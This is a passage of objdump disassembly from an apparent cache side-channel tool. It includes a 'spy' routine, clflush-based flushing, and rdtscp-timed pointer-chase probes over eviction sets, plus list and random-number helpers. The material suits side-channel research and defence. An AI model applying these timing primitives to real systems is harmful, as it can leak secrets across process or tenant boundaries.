    24fb:	48 83 ec 20          	sub    $0x20,%rsp
    24ff:	89 7d ec             	mov    %edi,-0x14(%rbp)
    2502:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    2506:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    250a:	48 83 c0 08          	add    $0x8,%rax
    250e:	48 8b 00             	mov    (%rax),%rax
    2511:	48 89 c7             	mov    %rax,%rdi
    2514:	e8 27 eb ff ff       	call   1040 <puts@plt>
    2519:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    251d:	48 83 c0 10          	add    $0x10,%rax
    2521:	48 8b 00             	mov    (%rax),%rax
    2524:	48 89 c7             	mov    %rax,%rdi
    2527:	e8 14 eb ff ff       	call   1040 <puts@plt>
    252c:	48 c7 45 f8 74 11 00 	movq   $0x1174,-0x8(%rbp)
    2533:	00 
    2534:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2538:	48 89 c7             	mov    %rax,%rdi
    253b:	e8 0d ee ff ff       	call   134d <my_access>
    2540:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2544:	48 89 c6             	mov    %rax,%rsi
    2547:	48 8d 05 37 1c 00 00 	lea    0x1c37(%rip),%rax        # 4185 <_IO_stdin_used+0x185>
    254e:	48 89 c7             	mov    %rax,%rdi
    2551:	b8 00 00 00 00       	mov    $0x0,%eax
    2556:	e8 35 eb ff ff       	call   1090 <printf@plt>
    255b:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    255f:	48 83 c0 08          	add    $0x8,%rax
    2563:	48 8b 00             	mov    (%rax),%rax
    2566:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    256a:	48 89 d6             	mov    %rdx,%rsi
    256d:	48 89 c7             	mov    %rax,%rdi
    2570:	e8 35 ff ff ff       	call   24aa <spy>
    2575:	b8 00 00 00 00       	mov    $0x0,%eax
    257a:	c9                   	leave
    257b:	c3                   	ret

000000000000257c <compare_uint64>:
    257c:	55                   	push   %rbp
    257d:	48 89 e5             	mov    %rsp,%rbp
    2580:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    2584:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    2588:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    258c:	48 8b 00             	mov    (%rax),%rax
    258f:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2593:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2597:	48 8b 00             	mov    (%rax),%rax
    259a:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    259e:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    25a2:	48 39 45 f0          	cmp    %rax,-0x10(%rbp)
    25a6:	0f 92 c0             	setb   %al
    25a9:	0f b6 d0             	movzbl %al,%edx
    25ac:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    25b0:	48 3b 45 f0          	cmp    -0x10(%rbp),%rax
    25b4:	0f 92 c0             	setb   %al
    25b7:	0f b6 c0             	movzbl %al,%eax
    25ba:	29 c2                	sub    %eax,%edx
    25bc:	89 d0                	mov    %edx,%eax
    25be:	5d                   	pop    %rbp
    25bf:	c3                   	ret

00000000000025c0 <median_uint64>:
    25c0:	55                   	push   %rbp
    25c1:	48 89 e5             	mov    %rsp,%rbp
    25c4:	48 83 ec 10          	sub    $0x10,%rsp
    25c8:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    25cc:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    25d0:	48 8b 75 f0          	mov    -0x10(%rbp),%rsi
    25d4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    25d8:	48 8d 15 9d ff ff ff 	lea    -0x63(%rip),%rdx        # 257c <compare_uint64>
    25df:	48 89 d1             	mov    %rdx,%rcx
    25e2:	ba 08 00 00 00       	mov    $0x8,%edx
    25e7:	48 89 c7             	mov    %rax,%rdi
    25ea:	e8 61 ea ff ff       	call   1050 <qsort@plt>
    25ef:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    25f3:	83 e0 01             	and    $0x1,%eax
    25f6:	48 85 c0             	test   %rax,%rax
    25f9:	75 3a                	jne    2635 <median_uint64+0x75>
    25fb:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    25ff:	48 d1 e8             	shr    %rax
    2602:	48 c1 e0 03          	shl    $0x3,%rax
    2606:	48 8d 50 f8          	lea    -0x8(%rax),%rdx
    260a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    260e:	48 01 d0             	add    %rdx,%rax
    2611:	48 8b 10             	mov    (%rax),%rdx
    2614:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    2618:	48 d1 e8             	shr    %rax
    261b:	48 8d 0c c5 00 00 00 	lea    0x0(,%rax,8),%rcx
    2622:	00 
    2623:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2627:	48 01 c8             	add    %rcx,%rax
    262a:	48 8b 00             	mov    (%rax),%rax
    262d:	48 01 d0             	add    %rdx,%rax
    2630:	48 d1 e8             	shr    %rax
    2633:	eb 19                	jmp    264e <median_uint64+0x8e>
    2635:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    2639:	48 d1 e8             	shr    %rax
    263c:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    2643:	00 
    2644:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2648:	48 01 d0             	add    %rdx,%rax
    264b:	48 8b 00             	mov    (%rax),%rax
    264e:	c9                   	leave
    264f:	c3                   	ret

0000000000002650 <my_access>:
    2650:	55                   	push   %rbp
    2651:	48 89 e5             	mov    %rsp,%rbp
    2654:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    2658:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    265c:	48 8b 02             	mov    (%rdx),%rax
    265f:	90                   	nop
    2660:	5d                   	pop    %rbp
    2661:	c3                   	ret

0000000000002662 <flush>:
    2662:	55                   	push   %rbp
    2663:	48 89 e5             	mov    %rsp,%rbp
    2666:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    266a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    266e:	0f ae 38             	clflush (%rax)
    2671:	90                   	nop
    2672:	5d                   	pop    %rbp
    2673:	c3                   	ret

0000000000002674 <probe_chase_loop>:
    2674:	55                   	push   %rbp
    2675:	48 89 e5             	mov    %rsp,%rbp
    2678:	53                   	push   %rbx
    2679:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
    267d:	48 89 75 d8          	mov    %rsi,-0x28(%rbp)
    2681:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2685:	48 8b 7d d8          	mov    -0x28(%rbp),%rdi
    2689:	48 89 c3             	mov    %rax,%rbx
    268c:	49 89 d8             	mov    %rbx,%r8
    268f:	49 89 f9             	mov    %rdi,%r9
    2692:	0f ae f0             	mfence
    2695:	0f 01 f9             	rdtscp
    2698:	48 89 c6             	mov    %rax,%rsi

000000000000269b <loop>:
    269b:	0f ae e8             	lfence
    269e:	4d 8b 00             	mov    (%r8),%r8
    26a1:	49 ff c9             	dec    %r9
    26a4:	0f ae e8             	lfence
    26a7:	75 f2                	jne    269b <loop>
    26a9:	0f ae e8             	lfence
    26ac:	0f 01 f9             	rdtscp
    26af:	48 29 f0             	sub    %rsi,%rax
    26b2:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    26b6:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    26ba:	48 8b 5d f8          	mov    -0x8(%rbp),%rbx
    26be:	c9                   	leave
    26bf:	c3                   	ret

00000000000026c0 <probe_evset_chase>:
    26c0:	55                   	push   %rbp
    26c1:	48 89 e5             	mov    %rsp,%rbp
    26c4:	53                   	push   %rbx
    26c5:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
    26c9:	48 8b 05 50 3a 00 00 	mov    0x3a50(%rip),%rax        # 6120 <conf>
    26d0:	48 8b 00             	mov    (%rax),%rax
    26d3:	48 8d 78 01          	lea    0x1(%rax),%rdi
    26d7:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    26db:	48 89 c3             	mov    %rax,%rbx
    26de:	49 89 d8             	mov    %rbx,%r8
    26e1:	49 89 f9             	mov    %rdi,%r9
    26e4:	0f ae f0             	mfence
    26e7:	0f 01 f9             	rdtscp
    26ea:	48 89 c6             	mov    %rax,%rsi

00000000000026ed <loop2>:
    26ed:	0f ae e8             	lfence
    26f0:	4d 8b 00             	mov    (%r8),%r8
    26f3:	49 ff c9             	dec    %r9
    26f6:	0f ae e8             	lfence
    26f9:	75 f2                	jne    26ed <loop2>
    26fb:	0f ae e8             	lfence
    26fe:	0f 01 f9             	rdtscp
    2701:	48 29 f0             	sub    %rsi,%rax
    2704:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    2708:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    270c:	48 8b 5d f8          	mov    -0x8(%rbp),%rbx
    2710:	c9                   	leave
    2711:	c3                   	ret

0000000000002712 <wait>:
    2712:	55                   	push   %rbp
    2713:	48 89 e5             	mov    %rsp,%rbp
    2716:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
    271a:	48 8d 45 e4          	lea    -0x1c(%rbp),%rax
    271e:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    2722:	0f 01 f9             	rdtscp
    2725:	89 ce                	mov    %ecx,%esi
    2727:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
    272b:	89 31                	mov    %esi,(%rcx)
    272d:	48 c1 e2 20          	shl    $0x20,%rdx
    2731:	48 09 d0             	or     %rdx,%rax
    2734:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2738:	90                   	nop
    2739:	48 8d 45 e4          	lea    -0x1c(%rbp),%rax
    273d:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
    2741:	0f 01 f9             	rdtscp
    2744:	89 ce                	mov    %ecx,%esi
    2746:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
    274a:	89 31                	mov    %esi,(%rcx)
    274c:	48 c1 e2 20          	shl    $0x20,%rdx
    2750:	48 09 d0             	or     %rdx,%rax
    2753:	48 2b 45 f8          	sub    -0x8(%rbp),%rax
    2757:	48 3b 45 d8          	cmp    -0x28(%rbp),%rax
    275b:	72 dc                	jb     2739 <wait+0x27>
    275d:	90                   	nop
    275e:	90                   	nop
    275f:	5d                   	pop    %rbp
    2760:	c3                   	ret

0000000000002761 <lfsr_create>:
    2761:	55                   	push   %rbp
    2762:	48 89 e5             	mov    %rsp,%rbp
    2765:	48 0f c7 f0          	rdrand %rax
    2769:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    276d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2771:	5d                   	pop    %rbp
    2772:	c3                   	ret

0000000000002773 <lfsr_rand>:
    2773:	55                   	push   %rbp
    2774:	48 89 e5             	mov    %rsp,%rbp
    2777:	48 83 ec 20          	sub    $0x20,%rsp
    277b:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    277f:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
    2786:	00 
    2787:	eb 1b                	jmp    27a4 <lfsr_rand+0x31>
    2789:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    278d:	48 8b 00             	mov    (%rax),%rax
    2790:	48 89 c7             	mov    %rax,%rdi
    2793:	e8 1c 00 00 00       	call   27b4 <lfsr_step>
    2798:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    279c:	48 89 02             	mov    %rax,(%rdx)
    279f:	48 83 45 f8 01       	addq   $0x1,-0x8(%rbp)
    27a4:	48 83 7d f8 3f       	cmpq   $0x3f,-0x8(%rbp)
    27a9:	76 de                	jbe    2789 <lfsr_rand+0x16>
    27ab:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    27af:	48 8b 00             	mov    (%rax),%rax
    27b2:	c9                   	leave
    27b3:	c3                   	ret

00000000000027b4 <lfsr_step>:
    27b4:	55                   	push   %rbp
    27b5:	48 89 e5             	mov    %rsp,%rbp
    27b8:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    27bc:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    27c0:	83 e0 01             	and    $0x1,%eax
    27c3:	48 85 c0             	test   %rax,%rax
    27c6:	74 19                	je     27e1 <lfsr_step+0x2d>
    27c8:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    27cc:	48 d1 e8             	shr    %rax
    27cf:	48 89 c2             	mov    %rax,%rdx
    27d2:	48 b8 e2 19 00 00 00 	movabs $0x80000000000019e2,%rax
    27d9:	00 00 80 
    27dc:	48 31 d0             	xor    %rdx,%rax
    27df:	eb 07                	jmp    27e8 <lfsr_step+0x34>
    27e1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    27e5:	48 d1 e8             	shr    %rax
    27e8:	5d                   	pop    %rbp
    27e9:	c3                   	ret

00000000000027ea <config_init>:
    27ea:	55                   	push   %rbp
    27eb:	48 89 e5             	mov    %rsp,%rbp
    27ee:	48 83 ec 40          	sub    $0x40,%rsp
    27f2:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    27f6:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    27fa:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
    27fe:	48 89 4d d0          	mov    %rcx,-0x30(%rbp)
    2802:	4c 89 45 c8          	mov    %r8,-0x38(%rbp)
    2806:	4c 89 4d c0          	mov    %r9,-0x40(%rbp)
    280a:	bf 38 00 00 00       	mov    $0x38,%edi
    280f:	e8 cc e8 ff ff       	call   10e0 <malloc@plt>
    2814:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2818:	4c 8b 45 c8          	mov    -0x38(%rbp),%r8
    281c:	48 8b 7d d0          	mov    -0x30(%rbp),%rdi
    2820:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
    2824:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
    2828:	48 8b 75 e8          	mov    -0x18(%rbp),%rsi
    282c:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2830:	ff 75 10             	push   0x10(%rbp)
    2833:	ff 75 c0             	push   -0x40(%rbp)
    2836:	4d 89 c1             	mov    %r8,%r9
    2839:	49 89 f8             	mov    %rdi,%r8
    283c:	48 89 c7             	mov    %rax,%rdi
    283f:	e8 0a 00 00 00       	call   284e <config_update>
    2844:	48 83 c4 10          	add    $0x10,%rsp
    2848:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    284c:	c9                   	leave
    284d:	c3                   	ret

000000000000284e <config_update>:
    284e:	55                   	push   %rbp
    284f:	48 89 e5             	mov    %rsp,%rbp
    2852:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    2856:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    285a:	48 89 55 e8          	mov    %rdx,-0x18(%rbp)
    285e:	48 89 4d e0          	mov    %rcx,-0x20(%rbp)
    2862:	4c 89 45 d8          	mov    %r8,-0x28(%rbp)
    2866:	4c 89 4d d0          	mov    %r9,-0x30(%rbp)
    286a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    286e:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    2872:	48 89 10             	mov    %rdx,(%rax)
    2875:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2879:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    287d:	48 89 50 08          	mov    %rdx,0x8(%rax)
    2881:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2885:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
    2889:	48 89 50 10          	mov    %rdx,0x10(%rax)
    288d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2891:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
    2895:	48 89 50 18          	mov    %rdx,0x18(%rax)
    2899:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    289d:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
    28a1:	48 89 50 20          	mov    %rdx,0x20(%rax)
    28a5:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    28a9:	48 8b 55 10          	mov    0x10(%rbp),%rdx
    28ad:	48 89 50 28          	mov    %rdx,0x28(%rax)
    28b1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    28b5:	48 8b 55 18          	mov    0x18(%rbp),%rdx
    28b9:	48 89 50 30          	mov    %rdx,0x30(%rax)
    28bd:	90                   	nop
    28be:	5d                   	pop    %rbp
    28bf:	c3                   	ret

00000000000028c0 <list_init>:
    28c0:	55                   	push   %rbp
    28c1:	48 89 e5             	mov    %rsp,%rbp
    28c4:	53                   	push   %rbx
    28c5:	48 83 ec 38          	sub    $0x38,%rsp
    28c9:	48 89 7d c8          	mov    %rdi,-0x38(%rbp)
    28cd:	48 89 75 c0          	mov    %rsi,-0x40(%rbp)
    28d1:	bf 00 00 00 00       	mov    $0x0,%edi
    28d6:	e8 e5 e7 ff ff       	call   10c0 <time@plt>
    28db:	89 c7                	mov    %eax,%edi
    28dd:	e8 be e7 ff ff       	call   10a0 <srand@plt>
    28e2:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    28e6:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
    28ed:	00 
    28ee:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    28f2:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    28f9:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    28fd:	48 c7 40 10 00 00 00 	movq   $0x0,0x10(%rax)
    2904:	00 
    2905:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2909:	48 83 c0 18          	add    $0x18,%rax
    290d:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    2911:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
    2918:	eb 20                	jmp    293a <list_init+0x7a>
    291a:	8b 45 ec             	mov    -0x14(%rbp),%eax
    291d:	48 98                	cltq
    291f:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
    2926:	00 
    2927:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    292b:	48 8d 1c 02          	lea    (%rdx,%rax,1),%rbx
    292f:	e8 3c e8 ff ff       	call   1170 <rand@plt>
    2934:	89 03                	mov    %eax,(%rbx)
    2936:	83 45 ec 01          	addl   $0x1,-0x14(%rbp)
    293a:	83 7d ec 09          	cmpl   $0x9,-0x14(%rbp)
    293e:	7e da                	jle    291a <list_init+0x5a>
    2940:	48 c7 45 e0 01 00 00 	movq   $0x1,-0x20(%rbp)
    2947:	00 
    2948:	e9 d5 00 00 00       	jmp    2a22 <list_init+0x162>
    294d:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2951:	48 c1 e0 06          	shl    $0x6,%rax
    2955:	48 8d 48 c0          	lea    -0x40(%rax),%rcx
    2959:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    295d:	48 c1 e0 06          	shl    $0x6,%rax
    2961:	48 89 c2             	mov    %rax,%rdx
    2964:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2968:	48 01 d0             	add    %rdx,%rax
    296b:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
    296f:	48 01 ca             	add    %rcx,%rdx
    2972:	48 89 50 08          	mov    %rdx,0x8(%rax)
    2976:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    297a:	48 c1 e0 06          	shl    $0x6,%rax
    297e:	48 89 c1             	mov    %rax,%rcx
    2981:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2985:	48 c1 e0 06          	shl    $0x6,%rax
    2989:	48 89 c2             	mov    %rax,%rdx
    298c:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2990:	48 01 d0             	add    %rdx,%rax
    2993:	48 8b 40 08          	mov    0x8(%rax),%rax
    2997:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
    299b:	48 01 ca             	add    %rcx,%rdx
    299e:	48 89 10             	mov    %rdx,(%rax)
    29a1:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    29a5:	48 c1 e0 06          	shl    $0x6,%rax
    29a9:	48 89 c2             	mov    %rax,%rdx
    29ac:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    29b0:	48 01 d0             	add    %rdx,%rax
    29b3:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    29ba:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    29be:	48 c1 e0 06          	shl    $0x6,%rax
    29c2:	48 89 c2             	mov    %rax,%rdx
    29c5:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    29c9:	48 01 d0             	add    %rdx,%rax
    29cc:	48 c7 40 10 00 00 00 	movq   $0x0,0x10(%rax)
    29d3:	00 
    29d4:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    29d8:	48 c1 e0 06          	shl    $0x6,%rax
    29dc:	48 89 c2             	mov    %rax,%rdx
    29df:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    29e3:	48 01 d0             	add    %rdx,%rax
    29e6:	48 83 c0 18          	add    $0x18,%rax
    29ea:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    29ee:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%rbp)
    29f5:	eb 20                	jmp    2a17 <list_init+0x157>
    29f7:	8b 45 dc             	mov    -0x24(%rbp),%eax
    29fa:	48 98                	cltq
    29fc:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
    2a03:	00 
    2a04:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    2a08:	48 8d 1c 02          	lea    (%rdx,%rax,1),%rbx
    2a0c:	e8 5f e7 ff ff       	call   1170 <rand@plt>
    2a11:	89 03                	mov    %eax,(%rbx)
    2a13:	83 45 dc 01          	addl   $0x1,-0x24(%rbp)
    2a17:	83 7d dc 09          	cmpl   $0x9,-0x24(%rbp)
    2a1b:	7e da                	jle    29f7 <list_init+0x137>
    2a1d:	48 83 45 e0 01       	addq   $0x1,-0x20(%rbp)
    2a22:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    2a26:	48 c1 e8 06          	shr    $0x6,%rax
    2a2a:	48 39 45 e0          	cmp    %rax,-0x20(%rbp)
    2a2e:	0f 82 19 ff ff ff    	jb     294d <list_init+0x8d>
    2a34:	90                   	nop
    2a35:	90                   	nop
    2a36:	48 8b 5d f8          	mov    -0x8(%rbp),%rbx
    2a3a:	c9                   	leave
    2a3b:	c3                   	ret

0000000000002a3c <list_push>:
    2a3c:	55                   	push   %rbp
    2a3d:	48 89 e5             	mov    %rsp,%rbp
    2a40:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    2a44:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    2a48:	48 83 7d f0 00       	cmpq   $0x0,-0x10(%rbp)
    2a4d:	74 42                	je     2a91 <list_push+0x55>
    2a4f:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    2a53:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
    2a5a:	00 
    2a5b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2a5f:	48 8b 10             	mov    (%rax),%rdx
    2a62:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    2a66:	48 89 10             	mov    %rdx,(%rax)
    2a69:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2a6d:	48 8b 00             	mov    (%rax),%rax
    2a70:	48 85 c0             	test   %rax,%rax
    2a73:	74 0f                	je     2a84 <list_push+0x48>
    2a75:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2a79:	48 8b 00             	mov    (%rax),%rax
    2a7c:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    2a80:	48 89 50 08          	mov    %rdx,0x8(%rax)
    2a84:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2a88:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    2a8c:	48 89 10             	mov    %rdx,(%rax)
    2a8f:	eb 01                	jmp    2a92 <list_push+0x56>
    2a91:	90                   	nop
    2a92:	5d                   	pop    %rbp
    2a93:	c3                   	ret

0000000000002a94 <list_append>:
    2a94:	55                   	push   %rbp
    2a95:	48 89 e5             	mov    %rsp,%rbp
    2a98:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    2a9c:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    2aa0:	48 83 7d e0 00       	cmpq   $0x0,-0x20(%rbp)
    2aa5:	0f 84 a3 00 00 00    	je     2b4e <list_append+0xba>
    2aab:	48 83 7d e8 00       	cmpq   $0x0,-0x18(%rbp)
    2ab0:	75 24                	jne    2ad6 <list_append+0x42>
    2ab2:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2ab6:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    2abd:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2ac1:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
    2ac8:	00 
    2ac9:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    2acd:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
    2ad1:	48 89 10             	mov    %rdx,(%rax)
    2ad4:	eb 79                	jmp    2b4f <list_append+0xbb>
    2ad6:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    2ada:	48 8b 00             	mov    (%rax),%rax
    2add:	48 85 c0             	test   %rax,%rax
    2ae0:	75 24                	jne    2b06 <list_append+0x72>
    2ae2:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2ae6:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    2aed:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2af1:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
    2af8:	00 
    2af9:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    2afd:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
    2b01:	48 89 10             	mov    %rdx,(%rax)
    2b04:	eb 49                	jmp    2b4f <list_append+0xbb>
    2b06:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    2b0a:	48 8b 00             	mov    (%rax),%rax
    2b0d:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2b11:	eb 0b                	jmp    2b1e <list_append+0x8a>
    2b13:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2b17:	48 8b 00             	mov    (%rax),%rax
    2b1a:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2b1e:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2b22:	48 8b 00             	mov    (%rax),%rax
    2b25:	48 85 c0             	test   %rax,%rax
    2b28:	75 e9                	jne    2b13 <list_append+0x7f>
    2b2a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2b2e:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
    2b32:	48 89 10             	mov    %rdx,(%rax)
    2b35:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2b39:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    2b3d:	48 89 50 08          	mov    %rdx,0x8(%rax)
    2b41:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2b45:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    2b4c:	eb 01                	jmp    2b4f <list_append+0xbb>
    2b4e:	90                   	nop
    2b4f:	5d                   	pop    %rbp
    2b50:	c3                   	ret

0000000000002b51 <list_pop>:
    2b51:	55                   	push   %rbp
    2b52:	48 89 e5             	mov    %rsp,%rbp
    2b55:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    2b59:	48 83 7d e8 00       	cmpq   $0x0,-0x18(%rbp)
    2b5e:	74 09                	je     2b69 <list_pop+0x18>
    2b60:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    2b64:	48 8b 00             	mov    (%rax),%rax
    2b67:	eb 05                	jmp    2b6e <list_pop+0x1d>
    2b69:	b8 00 00 00 00       	mov    $0x0,%eax
    2b6e:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2b72:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    2b77:	75 07                	jne    2b80 <list_pop+0x2f>
    2b79:	b8 00 00 00 00       	mov    $0x0,%eax
    2b7e:	eb 44                	jmp    2bc4 <list_pop+0x73>
    2b80:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2b84:	48 8b 00             	mov    (%rax),%rax
    2b87:	48 85 c0             	test   %rax,%rax
    2b8a:	74 0f                	je     2b9b <list_pop+0x4a>
    2b8c:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2b90:	48 8b 00             	mov    (%rax),%rax
    2b93:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
    2b9a:	00 
    2b9b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2b9f:	48 8b 10             	mov    (%rax),%rdx
    2ba2:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    2ba6:	48 89 10             	mov    %rdx,(%rax)
    2ba9:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2bad:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    2bb4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2bb8:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
    2bbf:	00 
    2bc0:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2bc4:	5d                   	pop    %rbp
    2bc5:	c3                   	ret

0000000000002bc6 <list_get>:
    2bc6:	55                   	push   %rbp
    2bc7:	48 89 e5             	mov    %rsp,%rbp
    2bca:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    2bce:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    2bd2:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
